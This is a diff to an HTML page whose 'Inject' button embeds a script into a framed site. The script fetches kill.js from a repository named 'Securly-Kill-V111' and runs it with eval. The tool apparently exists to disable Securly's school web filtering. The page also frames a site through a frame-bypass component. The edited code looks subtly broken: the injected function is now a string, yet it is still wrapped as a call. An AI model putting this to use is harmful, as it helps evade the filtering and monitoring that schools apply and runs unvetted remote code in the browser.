@@ -40,20 +40,19 @@
 	<script>
 		function injectCode() {
 			const iframe = document.querySelector('iframe');
+			const bookmarkletCode = `
+				fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
+					.then(r => r.text())
+					.then(r => eval(r));
+			`;
 			const script = document.createElement('script');
 			script.text = `(${bookmarkletCode})();`;
-			iframe.contentDocument.body.appendChild(script);
-		}
-
-		function bookmarkletCode() {
-			fetch('https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js')
-				.then(r => r.text())
-				.then(r => eval(r));
+			iframe.contentWindow.document.body.appendChild(script);
 		}
 	</script>
 </head>
 <body>
-	<iframe is="x-frame-bypass" src="https://www.securly.com/"></iframe>
+	<iframe is="x-frame-bypass" src="https://news.ycombinator.com/"></iframe>
 	<a href="https://github.com/niutech/x-frame-bypass"><img src="https://s3.amazonaws.com/github/ribbons/forkme_right_gray_6d6d6d.png" alt="Fork me on GitHub"></a>
 	<button class="inject-button" onclick="injectCode()">Inject</button>
 </body>
